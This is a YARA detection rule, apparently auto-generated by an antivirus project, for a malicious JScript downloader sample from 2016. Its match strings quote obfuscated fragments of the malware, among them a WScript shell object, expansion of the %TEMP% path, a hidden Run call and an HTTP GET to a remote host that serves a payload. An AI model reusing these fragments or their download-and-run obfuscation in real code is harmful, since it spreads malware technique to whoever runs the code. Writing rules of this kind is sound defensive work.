rule sig_20160428_c1bbd954c04c39ab0da876d9df3d1f6b {
  meta:
    description = "datamaliciousorder - file 20160428_c1bbd954c04c39ab0da876d9df3d1f6b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9a5174f033577d107c26a4759c5052474b877476e80a68b03204ba428f2237fc"

  strings:
    $s1  = "XkdTuiEcdFajDbtAtyWkk[AxvRdaZllYjjZrhLigPsm](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function EzxGvrDwfWfqMapXyoXhl(MbgGgjRbeWlhOyhVzlLcp, ItwBhhLbxQxwKmrSbaWlf){NilOrfCynFjlZfeVnmMlk = NilOrfCynFjlZfeVnmMlk * 1; " ascii
    $s3  = "return MbgGgjRbeWlhOyhVzlLcp - ItwBhhLbxQxwKmrSbaWlf;};" fullword ascii
    $s4  = "function YflXfeZysCkcNjwHydWur() {return CufGsaCamWmxQgqGieYgl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "function VcjEzjTnaNjlTweMrtBnz(GnjUrgGwxOrkDsjQczBim){CufGsaCamWmxQgqGieYgl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "function VcjEzjTnaNjlTweMrtBnz(GnjUrgGwxOrkDsjQczBim){CufGsaCamWmxQgqGieYgl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s7  = "function EzxGvrDwfWfqMapXyoXhl(MbgGgjRbeWlhOyhVzlLcp, ItwBhhLbxQxwKmrSbaWlf){NilOrfCynFjlZfeVnmMlk = NilOrfCynFjlZfeVnmMlk * 1; " ascii
    $s8  = "var CufGsaCamWmxQgqGieYgl = function RluGtvTkhLylRnhCdgFqt() {return AxtHpqWzqHckKwzCarOeu[QzmTxvBjqYlvNwiAqeRdv](\"WScript\"+\"" ascii
    $s9  = "function NveFluQsqDmfLncEaiUzh(){return IgzRnjVxrNhnMzhGvmSxh + \"\";};" fullword ascii
    $s10 = "if (XkdTuiEcdFajDbtAtyWkk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "function OrjQzyVpzJpjCrqVhbYvb() {return ((HkxAcrCjeIlsNfpYwoQjr == true) && (HkxAcrCjeIlsNfpYwoQjr == UuuPfbBjmIreWdzWdgQkd)) ?" ascii
    $s12 = "function OrjQzyVpzJpjCrqVhbYvb() {return ((HkxAcrCjeIlsNfpYwoQjr == true) && (HkxAcrCjeIlsNfpYwoQjr == UuuPfbBjmIreWdzWdgQkd)) ?" ascii
    $s13 = "var CufGsaCamWmxQgqGieYgl = function RluGtvTkhLylRnhCdgFqt() {return AxtHpqWzqHckKwzCarOeu[QzmTxvBjqYlvNwiAqeRdv](\"WScript\"+\"" ascii
    $s14 = "var AxtHpqWzqHckKwzCarOeu = this[\"WScript\"];" fullword ascii
    $s15 = "function YflXfeZysCkcNjwHydWur() {return CufGsaCamWmxQgqGieYgl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s16 = "return EzxGvrDwfWfqMapXyoXhl(1 == 1 ? QcrWifZabMxjTfiCeqFga : 0, 1 == 1 ? LlpTvmIdcCvqMglVcjZli : 0);" fullword ascii
    $s17 = "SsdQheVreHqxMkkLanFuj = true;" fullword ascii
    $s18 = "function FidBflZjpXnbJhbRdxEqi()" fullword ascii
    $s19 = "var HkxAcrCjeIlsNfpYwoQjr = false;" fullword ascii
    $s20 = "var UuuPfbBjmIreWdzWdgQkd = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}